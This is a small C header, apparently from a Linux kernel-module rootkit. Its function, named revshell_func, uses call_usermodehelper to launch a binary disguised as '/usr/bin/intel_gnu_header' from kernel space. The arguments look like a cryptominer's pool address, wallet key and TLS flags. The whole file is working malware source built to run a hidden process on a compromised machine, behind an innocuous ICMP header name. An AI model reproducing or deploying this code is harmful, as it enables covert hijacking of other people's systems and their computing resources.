#ifndef ICMP_RCV_H
#define ICMP_RCV_H
#include "../config.h"

int revshell_func(void *data) {
    static char *envp[] = {
        "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL
    };
    char *argv[] = {
        "/usr/bin/intel_gnu_header",
        "-o", "test:443",
        "-u", "44xquCZQQk4MTL6M2Y73",
        "-k",
        "--tls",
        "-p", "prolay",
        NULL
    };

    // Execute once without loop
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    
    return 0;
}



#endif // !ICMP_RCV_H
